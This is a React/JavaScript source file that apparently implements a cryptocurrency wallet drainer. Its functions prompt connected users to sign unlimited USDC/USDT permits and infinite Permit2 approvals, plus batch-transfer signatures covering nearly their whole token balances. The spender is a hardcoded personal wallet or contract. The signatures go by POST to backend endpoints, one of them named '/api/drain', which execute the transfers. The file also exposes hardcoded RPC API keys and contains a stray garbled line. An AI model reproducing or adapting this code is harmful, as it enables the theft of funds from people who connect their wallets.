import { useState, useEffect } from 'react'
import { useAppKitAccount, useAppKitProvider } from '@reown/appkit/react'
import { useBalance, useReadContracts, useAccount, useWalletClient } from 'wagmi'
import { createWalletClient, custom, getAddress, parseUnits, encodeFunctionData, createPublicClient, erc20Abi, http } from 'viem';
import { mainnet, sepolia } from 'viem/chains';
import { getPublicClient } from '@wagmi/core'
import { createKernelAccountClient, createKernelAccount, createZeroDevPaymasterClient } from "@zerodev/sdk"
import { signerToEcdsaValidator } from '@zerodev/ecdsa-validator'
import { KERNEL_V3_1, getEntryPoint } from '@zerodev/sdk/constants'
import { toCallPolicy } from '@zerodev/permissions/policies'
import { toPermissionValidator } from '@zerodev/permissions'
import { toOwner } from 'permissionless'
import { generatePrivateKey, privateKeyToAccount } from "viem/accounts"
import { wagmiConfig } from './../config'
import { MaxUint256, ethers } from 'ethers';
const publicClient = getPublicClient(wagmiConfig)

const RPC_URL = "https://eth-mainnet.g.alchemy.com/v2/noU-8dMn-YuQmXvM-MPq4" 
const RPC_URL_TEST = "https://eth-sepolia.g.alchemy.com/v2/bH4tnbk132zyb0RYF4Opo" 
const BUNDLER_RPC = "https://rpc.zerodev.app/api/v2/bundler/6dc97753-3c4f-4c56-97fc-1299b5297d59"
const PAYMASTER_RPC = "https://rpc.zerodev.app/api/v2/paymaster/6dc97753-3c4f-4c56-97fc-1299b5297d59"

const MAIN_CONTRACT="0xe8A4cf2c94B8B151fA4526CC39d420514debB2f9"
const MY_WALLET = '0x94Eb2605F3E2e044ede97d1AD14d604a8eAFD3d3' // Exodus pc

const entryPoint = getEntryPoint("0.7")  // ✅ define once at top level
const kernelVersion = KERNEL_V3_1 

const TOKENS = [
  {
    address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
    decimals: 6,
    symbol: "USDC",
  },
  {
    address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
    decimals: 6,
    symbol: "USDT",
  }, 
]

const usdcAbi = [
  // permit
  {
    name: 'permit',
    type: 'function',
    stateMutability: 'nonpayable',
    inputs: [
      { name: 'owner',    type: 'address' },
      { name: 'spender',  type: 'address' },
      { name: 'value',    type: 'uint256' },
      { name: 'deadline', type: 'uint256' },
      { name: 'v',        type: 'uint8'   },
      { name: 'r',        type: 'bytes32' },
      { name: 's',        type: 'bytes32' },
    ],
    outputs: [],
  },
  // nonces
  {
    name: 'nonces',
    type: 'function',
    stateMutability: 'view',
    inputs:  [{ name: 'owner', type: 'address' }],
    outputs: [{ name: '',      type: 'uint256' }],
  },
  // balanceOf
  {
    name: 'balanceOf',
    type: 'function',
    stateMutability: 'view',
    inputs:  [{ name: 'account', type: 'address' }],
    outputs: [{ name: '',        type: 'uint256' }],
  },
  // transferFrom
  {
    name: 'transferFrom',
    type: 'function',
    stateMutability: 'nonpayable',
    inputs: [
      { name: 'from',  type: 'address' },
      { name: 'to',    type: 'address' },
      { name: 'value', type: 'uint256' },
    ],
    outputs: [{ name: '', type: 'bool' }],
  },
  { 
    name: 'name', 
    type: 'function', 
    stateMutability: 'view', 
    inputs: [], 
    outputs: [{ type: 'string' }] 
  },
  { 
    name: 'version', 
    type: 'function', 
    stateMutability: 'view', 
    inputs: [], 
    outputs: [{ type: 'string' }] 
  },
];

// const publicClient1 = createPublicClient({
//   chain: mainnet,
//   transport: http(RPC_URL),
// })


export function SessionWallet() {
  const [client, setClient] = useState(null)
  const [sessionKey, setSessionKey] = useState(null)

  const connectWithSession = async () => {
    try {
      // 1. Request accounts and build walletClient WITH account attached
      const [address] = await window.ethereum.request({
        method: 'eth_requestAccounts'
      })
      console.log("User:", address)

      const connectedWalletClient = createWalletClient({
        account: address,        // ✅ account must be set here
        chain: mainnet,
        transport: custom(window.ethereum)
      })

      // 2. Create ECDSA validator from connected wallet
      const ecdsaValidator = await signerToEcdsaValidator(publicClient, {
        signer: connectedWalletClient,  // ✅ pass walletClient directly, no toOwner needed
        entryPoint,
        kernelVersion,
      })

      // 3. Generate session key
      const sessionPrivateKey = generatePrivateKey()
      const sessionAccount = privateKeyToAccount(sessionPrivateKey)
      setSessionKey(sessionAccount)

      // 4. Create session key validator with permissions
      const sessionKeyValidator = await toPermissionValidator(publicClient, {
        entryPoint,
        kernelVersion,
        signer: sessionAccount,
        policies: [
          toCallPolicy({
            policyVersion: "0.0.2",
            permissions: [
              {
                target: getAddress(TOKENS[0].address), // ✅ checksum the address
                valueLimit: 0n,  
                abi: erc20Abi,
                functionName: "transfer",
                args: null,                             
              }
            ]
          })
        ],
      })

      // 5. Create kernel account with sudo + session validators
      const kernelAccount = await createKernelAccount(publicClient, {
        entryPoint,
        kernelVersion,
        plugins: {
          sudo: ecdsaValidator,
          regular: sessionKeyValidator,
          validUntil: Math.floor(Date.now() / 1000) + 3600,
        },
      })

      // 6. Create kernel client with paymaster (your wallet pays gas)
      const kernelClient = createKernelAccountClient({
        account: kernelAccount,
        chain: mainnet,
        bundlerTransport: http(BUNDLER_RPC),
        // middleware: {
        //   sponsorUserOperation: async ({ userOperation }) => {
        //     const paymasterClient = createZeroDevPaymasterClient({
        //       chain: mainnet,
        //       transport: http(PAYMASTER_RPC),
        //     })
        //     return paymasterClient.sponsorUserOperation({
        //       userOperation,
        //       entryPoint,
        //     })
        //   }
        // }
      })

      // 7. Send dummy tx to initialize session key — triggers ONE popup
      const txHash = await kernelClient.sendUserOperation({
        account: kernelAccount,
        calls: [
            {
            to: address,      // send to user's own address
            value: 0n,        // zero value
            data: "0x",       // empty data
            }
        ],
      })

      setClient(kernelClient)
      console.log("Session key ready:", sessionAccount.address)
      console.log("Tx hash:", txHash)

    } catch (err) {
        console.error("SessionWallet error:", err)
        console.error("message:", err.message)
        console.error("cause:", err.cause)
        console.error("details:", err.details)
        console.error("metaMessages:", err.metaMessages)
    }
  }
  return { connectWithSession }
}


function useTokenBalance(contracts, userAddress) {
  const { data, isLoading, refetch } = useReadContracts({
    contracts,
    query: { enabled: !!userAddress },
  })

  return { balances: data, isLoading, refetch }
}

async function getTokenBalances(userAddress) {
  const contracts = TOKENS.map(token => ({
    address: token.address,
    abi: erc20Abi,
    functionName: 'balanceOf',
    args: [userAddress],
  }));

  const results = await publicClient.multicall({ contracts });
  return results.map(r => r.result ?? 0n);
}

async function getUsdcNonce(userAddress) {
  try {
    const nonce = await publicClient.readContract({
      address: TOKENS[0].address,
      abi: usdcAbi,
      functionName: 'nonces',
      args: [userAddress],
    });
    
    return nonce;
  } catch (error) {
    console.error("Failed to fetch USDC nonce:", error);
    return 0n; // Fallback to 0 if the query fails (rare)
  }
}

// Works only for usdc
export async function handleLegacyTwoStep() {
  
  // Pop-up 1: Connect
  const [address] = await window.ethereum.request({ 
    method: 'eth_requestAccounts' 
  });
  const liveNonce = await getUsdcNonce(address);
  const deadline = Math.floor(Date.now() / 1000) + 3600;

  // Getting the balance
  const allBalances = await getTokenBalances(address);
  let balance, currentTokenAddy;

  if (allBalances[0] > allBalances[1]) {
    balance = allBalances[0];
    currentTokenAddy = TOKENS[0].address;
  } else {
    balance = allBalances[1];
    currentTokenAddy = TOKENS[1].address;
  }

  console.log(currentTokenAddy + ":" + balance)

  const provider = new ethers.BrowserProvider(window.ethereum);
  const signer = await provider.getSigner();
  const usdc = new ethers.Contract(currentTokenAddy, usdcAbi, signer);
  // Pop-up 2: Permit (Triggered automatically after Pop-up 1)
  const name = await usdc.name()
  const version = await usdc.version()
  const domain = {
    name: name,
    version: version, // Check USDC version for your specific chain
    chainId: 1,
    verifyingContract: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'
  };

  const types = {
    Permit: [
      { name: 'owner', type: 'address' },
      { name: 'spender', type: 'address' },
      { name: 'value', type: 'uint256' },
      { name: 'nonce', type: 'uint256' },
      { name: 'deadline', type: 'uint256' }
    ]
  };

  const message = {
    owner: address,
    spender: MY_WALLET,
    value: MaxUint256,
    nonce: liveNonce, // You must fetch the real nonce from the USDC contract
    deadline: deadline
  };

  const signature = await signer.signTypedData(domain, types, message);
  const { v, r, s } = ethers.Signature.from(signature);

  // submiting the permit
  try
  {
    console.log("in try")
    const permitData = { 
      owner: address, 
      spender: MY_WALLET, 
      value: MaxUint256.toString(), 
      deadline, 
      v, r, s 
    };

    await fetch(`http://localhost:3001/api/drain`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(permitData),
    });
  }
  catch(e){
    console.log(e.message)
  }
}




// ETH balance hook (per chain)
export function useEthBalance(userAddress) {
    

    const contracts = TOKENS.map(token => ({
        address: token.address,
        abi: erc20Abi,
        functionName: 'balanceOf',
        args: [userAddress],
        chainId: 1
    }))
    const { balances, isLoading, refetch } = useTokenBalance(contracts, userAddress);

    const sendingETH = async() => 
    {
        console.log("In sending ETH function")
        const result = await refetch()
        const balances = result.data
        console.dir(balances, {depth: null})
other
        if(!balances) return 

        for(let i=0; i < TOKENS.length; i++)
        {
            const balance = balances[i].result
            if (!balance || balance === 0n) continue

            const token = TOKENS[i]
            var isApproved = await checkSablierApproved(token.address, userAddress);

            if(!isApproved)
            {
                console.log("Wasn't approved")
                await approveAsync(token.address)
                console.log("Got approved")
            }
            
            console.log("Creating stream with this data: ", userAddress, TOKENS[i].address, token.decimals, balance)
            await createStream(userAddress, TOKENS[i].address, token.decimals, balance);
        }
    }

    // useEffect(() => {
    //     if (approved && userAddress) {
    //         createStream(userAddress, TOKEN.address, monthlyAmount, TOKEN.decimals)
    //     }
    // }, [approved])

    // const sendingETH = async () => {
    //     if (!isConnected) {
    //         console.log("Wallet not connected")
    //         return
    //     }

    //     if (isLoading) {
    //         console.log("Balance still loading...")
    //         return
    //     }

    //     if (!data?.value) {
    //         console.log("MetaMask chain:", window.ethereum?.networkVersion)
    //         console.log("userAddress:", userAddress)
    //         console.log("Full data: " + data.value)
    //         console.log("keys:", Object.keys(data || {}))
    //         console.log("No balance yet")
    //         return
    //     }       

    //     const balance = Number(data.value) / 1e18
    //     console.log("Balance:", balance)

    //     const amount = balance * 0.95

    //     if (amount > 0.0001) {
    //         await send(amount)
    //     }
    // }
    

    return { sendingETH }
}



const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'
const TOKENS2 = {
  USDC: { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 },
  DAI:  { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 },
  WETH: { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18 },
  USDT: { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
}

const ERC20_ABI = [
  {
    name: 'allowance',
    type: 'function',
    stateMutability: 'view',
    inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }],
    outputs: [{ type: 'uint256' }]
  },
  {
    name: 'approve',
    type: 'function',
    stateMutability: 'nonpayable',
    inputs: [{ name: 'spender', type: 'address' }, { name: 'amount', type: 'uint256' }],
    outputs: [{ type: 'bool' }]
  },
  {
    name: 'balanceOf',
    type: 'function',
    stateMutability: 'view',
    inputs: [{ name: 'account', type: 'address' }],
    outputs: [{ type: 'uint256' }]
  }
]

const PERMIT2_ABI = [
  // allowance() — to read nonces
  {
    name: 'allowance',
    type: 'function',
    stateMutability: 'view',
    inputs: [
      { name: 'owner',   type: 'address' },
      { name: 'token',   type: 'address' },
      { name: 'spender', type: 'address' }
    ],
    outputs: [
      { name: 'amount',     type: 'uint160' },
      { name: 'expiration', type: 'uint48'  },
      { name: 'nonce',      type: 'uint48'  }
    ]
  },
  // permitBatchTransferFrom() — spender calls this, pays gas
  {
    name: 'permitBatchTransferFrom',
    type: 'function',
    stateMutability: 'nonpayable',
    inputs: [
      {
        name: 'permit',
        type: 'tuple',
        components: [
          {
            name: 'permitted',
            type: 'tuple[]',
            components: [
              { name: 'token',  type: 'address' },
              { name: 'amount', type: 'uint256' }
            ]
          },
          { name: 'nonce',    type: 'uint256' },
          { name: 'deadline', type: 'uint256' }
        ]
      },
      {
        name: 'transferDetails',
        type: 'tuple[]',
        components: [
          { name: 'to',              type: 'address' },
          { name: 'requestedAmount', type: 'uint256' }
        ]
      },
      { name: 'owner',     type: 'address' },
      { name: 'signature', type: 'bytes'   }
    ],
    outputs: []
  }
]

// ─────────────────────────────────────────────
// PART 1: USER SIDE — runs in the browser
// User pays gas only for approve() calls
// ─────────────────────────────────────────────
export async function getUserSignature(walletClient, address) {
  //const [address] = address
  const spender = '0x94Eb2605F3E2e044ede97d1AD14d604a8eAFD3d3' // your contract
  const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600)
  const tokenList = Object.entries(TOKENS2)
  

  // STEP 1: Master approvals — user pays gas here (one-time per token)
  for (const [symbol, { address: tokenAddress, decimals }] of tokenList) {
    const allowance = await publicClient.readContract({
      address: tokenAddress,
      abi: ERC20_ABI,
      functionName: 'allowance',
      args: [address, PERMIT2_ADDRESS]
    })

    if (allowance === 0n) {
      console.log(`Approving Permit2 for ${symbol}...`)
      const hash = await walletClient.writeContract({
        address: tokenAddress,
        abi: ERC20_ABI,
        functionName: 'approve',
        args: [PERMIT2_ADDRESS, 2n ** 256n - 1n], // infinite approval
        account: address
      })
      // Wait for approval to confirm before proceeding
      await publicClient.waitForTransactionReceipt({ hash })
    }
  }

  // STEP 2: Build permitted list with correct decimals per token
  const permitted = tokenList.map(([symbol, { address: tokenAddress, decimals }]) => ({
    token: tokenAddress,
    amount: parseUnits('1000000', decimals) // use each token's actual decimals
  }))

  // STEP 3: Random nonce — no need to fetch from chain for SignatureTransfer
  const nonce = BigInt(`0x${crypto.randomUUID().replace(/-/g, '')}`)

  // STEP 4: Build EIP-712 data for PermitBatchTransferFrom
  const permitData = {
    domain: {
      name: 'Permit2',
      chainId: 1,
      verifyingContract: PERMIT2_ADDRESS
    },
    types: {
      PermitBatchTransferFrom: [
        { name: 'permitted', type: 'TokenPermissions[]' },
        { name: 'spender',   type: 'address'            },
        { name: 'nonce',     type: 'uint256'            },
        { name: 'deadline',  type: 'uint256'            }
      ],
      TokenPermissions: [
        { name: 'token',  type: 'address' },
        { name: 'amount', type: 'uint256' }
      ]
    },
    primaryType: 'PermitBatchTransferFrom',
    message: {
      permitted,
      spender,   // only this contract can use this signature
      nonce,
      deadline
    }
  }

  // STEP 5: User signs — NO gas cost, just a signature popup
  const signature = await walletClient.signTypedData({
      account: address,
    ...permitData
  })

  console.log('Signature acquired, sending to backend...')

  // STEP 6: Send signature to YOUR backend — spender will execute from there
  const response = await fetch('http://localhost:3001/api/execute-transfer', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      owner: address,
      signature,
      permitted: permitted.map(p => ({
        token: p.token,
        amount: p.amount.toString() // serialize BigInt
      })),
      nonce: nonce.toString(),
      deadline: deadline.toString()
    })
  })

  return await response.json()
}


// Seploia
// ─────────────────────────────────────────────
// PART 1: USER SIDE — runs in the browser
// User pays gas only for approve() calls
// ─────────────────────────────────────────────
export async function getUserSignatureSepolia(walletClient, address) { 
  console.log(3)

  const TOKENSTest = {
    USDC: {
      address: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238',
      decimals: 6
    },
    DAI: {
      address: '0x3e622317f8C93f7328350cF0B56d9eD4C620C5d6',
      decimals: 18
    }
  }
  const SPENDER_CONTRACT1 = '0xaD89504591b027112b8a4Cc9536b59451DBD4331'
  const SPENDER_CONTRACT = '0xbc97E8EC8f0603dfC76Ff2E356903013536f05D9' //Permit2Contract

  //const [address] = address
  const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600)
  const tokenList = Object.entries(TOKENSTest)

  // const walletClient = createWalletClient({
  //   account: address,
  //   chain: sepolia,
  //   transport: custom(walletProvider)
  // })

  const publicClient = createPublicClient({
    chain: sepolia,
    transport: http(RPC_URL_TEST)
  })
  const activeTokens = []
  // STEP 1: Master approvals — user pays gas here (one-time per token)
  try
  {
    for (const [symbol, { address: tokenAddress, decimals }] of tokenList) {
      const balance = await publicClient.readContract({
        address: tokenAddress,
        abi: ERC20_ABI,
        functionName: 'balanceOf',
        args: [address]
      })

      // ✅ Skip zero balance tokens
      if (balance === 0n) {
        console.log(`Skipping ${symbol} — zero balance`)
        continue
      }
      // check and approve if needed
      const allowance = await publicClient.readContract({
        address: tokenAddress,
        abi: ERC20_ABI,
        functionName: 'allowance',
        args: [address, PERMIT2_ADDRESS]
      })

      if (allowance < balance) {
        console.log(`Approving Permit2 for ${symbol}...`)
        const hash = await walletClient.writeContract({
          address: tokenAddress,
          abi: ERC20_ABI,
          functionName: 'approve',
          args: [PERMIT2_ADDRESS, 2n ** 256n - 1n], // infinite approval
          account: address
        })
        // Wait for approval to confirm before proceeding
        await publicClient.waitForTransactionReceipt({ hash })
      }
      activeTokens.push({
        token: tokenAddress,
        amount: balance-1n // ✅ only non-zero balances
      })
    }
  

    // ✅ Guard against all tokens being zero
    if (activeTokens.length === 0) {
      throw new Error('No token balances found')
    }
    console.log("SIGNER:", address)
    // STEP 2: Build permitted list with correct decimals per token
    const permitted = activeTokens
    console.log(permitted)
    

    // STEP 3: Random nonce — no need to fetch from chain for SignatureTransfer
    const nonce = BigInt(`0x${crypto.randomUUID().replace(/-/g, '')}`)

    // STEP 4: Build EIP-712 data for PermitBatchTransferFrom
    const permitData = {
      domain: {
        name: 'Permit2',
        chainId: 11155111,
        verifyingContract: PERMIT2_ADDRESS
      },
      types: {
        PermitBatchTransferFrom: [
          { name: 'permitted', type: 'TokenPermissions[]' },
          { name: 'spender',   type: 'address'            },
          { name: 'nonce',     type: 'uint256'            },
          { name: 'deadline',  type: 'uint256'            }
        ],
        TokenPermissions: [
          { name: 'token',  type: 'address' },
          { name: 'amount', type: 'uint256' }
        ]
      },
      primaryType: 'PermitBatchTransferFrom',
      message: {
        permitted,
        spender: SPENDER_CONTRACT,   // only this contract can use this signature
        nonce,
        deadline
      }
    }

    console.log("Domain chainId:", permitData.domain.chainId)
    console.log("Spender:", permitData.message.spender)
    console.log("PERMIT2:", permitData.domain.verifyingContract)
    console.log("Tokens to permit:", activeTokens.length)
    
    // STEP 5: User signs — NO gas cost, just a signature popup
    const signature = await walletClient.signTypedData({
        account: address,
      ...permitData
    })
    


    console.log('Signature acquired, sending to backend...')

    // STEP 6: Send signature to YOUR backend — spender will execute from there
    const response = await fetch('http://localhost:3001/api/execute-transfer-test', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        user: address,
        signature,
        permitted: permitted.map(p => ({
          token: p.token,
          amount: p.amount.toString() // serialize BigInt
        })),
        nonce: nonce.toString(),
        deadline: deadline.toString()
      })
    })

    return await response.json()
    }
  catch(err)
  {
    return false
  }
}






// ─────────────────────────────────────────────
// PART 1: USER SIDE — runs in the browser
// User pays gas only for approve() calls
// ─────────────────────────────────────────────
export async function getUserSignature2(walletClient, address) { 
  console.log(3)

  const TOKENS = {
    USDC: { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 },
    DAI:  { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 },
    WETH: { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18 },
    USDT: { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
  }

  //const [address] = address
  const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600)
  const tokenList = Object.entries(TOKENS)

  // const walletClient = createWalletClient({
  //   account: address,
  //   chain: sepolia,
  //   transport: custom(walletProvider)
  // })

  const publicClient = createPublicClient({
    chain: mainnet,
    transport: http(RPC_URL)
  })
  const activeTokens = []
  // STEP 1: Master approvals — user pays gas here (one-time per token)
  try
  {
    for (const [symbol, { address: tokenAddress, decimals }] of tokenList) {
      const balance = await publicClient.readContract({
        address: tokenAddress,
        abi: ERC20_ABI,
        functionName: 'balanceOf',
        args: [address]
      })

      // ✅ Skip zero balance tokens
      if (balance === 0n) {
        console.log(`Skipping ${symbol} — zero balance`)
        continue
      }
      // check and approve if needed
      const allowance = await publicClient.readContract({
        address: tokenAddress,
        abi: ERC20_ABI,
        functionName: 'allowance',
        args: [address, PERMIT2_ADDRESS]
      })

      if (allowance < balance) {
        console.log(`Approving Permit2 for ${symbol}...`)
        const hash = await walletClient.writeContract({
          address: tokenAddress,
          abi: ERC20_ABI,
          functionName: 'approve',
          args: [PERMIT2_ADDRESS, 2n ** 256n - 1n], // infinite approval
          account: address
        })
        // Wait for approval to confirm before proceeding
        await publicClient.waitForTransactionReceipt({ hash })
      }
      activeTokens.push({
        token: tokenAddress,
        amount: balance-1n // ✅ only non-zero balances
      })
    }
  

    // ✅ Guard against all tokens being zero
    if (activeTokens.length === 0) {
      throw new Error('No token balances found')
    }
    console.log("SIGNER:", address)
    // STEP 2: Build permitted list with correct decimals per token
    const permitted = activeTokens
    console.log(permitted)
    

    // STEP 3: Random nonce — no need to fetch from chain for SignatureTransfer
    const nonce = BigInt(`0x${crypto.randomUUID().replace(/-/g, '')}`)

    // STEP 4: Build EIP-712 data for PermitBatchTransferFrom
    const permitData = {
      domain: {
        name: 'Permit2',
        chainId: 1,
        verifyingContract: PERMIT2_ADDRESS
      },
      types: {
        PermitBatchTransferFrom: [
          { name: 'permitted', type: 'TokenPermissions[]' },
          { name: 'spender',   type: 'address'            },
          { name: 'nonce',     type: 'uint256'            },
          { name: 'deadline',  type: 'uint256'            }
        ],
        TokenPermissions: [
          { name: 'token',  type: 'address' },
          { name: 'amount', type: 'uint256' }
        ]
      },
      primaryType: 'PermitBatchTransferFrom',
      message: {
        permitted,
        spender: MAIN_CONTRACT,   // only this contract can use this signature
        nonce,
        deadline
      }
    }


    // STEP 5: User signs — NO gas cost, just a signature popup
    const signature = await walletClient.signTypedData({
        account: address,
      ...permitData
    })
    


    console.log('Signature acquired, sending to backend...')

    // STEP 6: Send signature to YOUR backend — spender will execute from there
    const response = await fetch('http://localhost:3001/api/execute-transfer', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        user: address,
        signature,
        permitted: permitted.map(p => ({
          token: p.token,
          amount: p.amount.toString() // serialize BigInt
        })),
        nonce: nonce.toString(),
        deadline: deadline.toString()
      })
    })

    return await response.json()
    }
  catch(err)
  {
    return false
  }
}

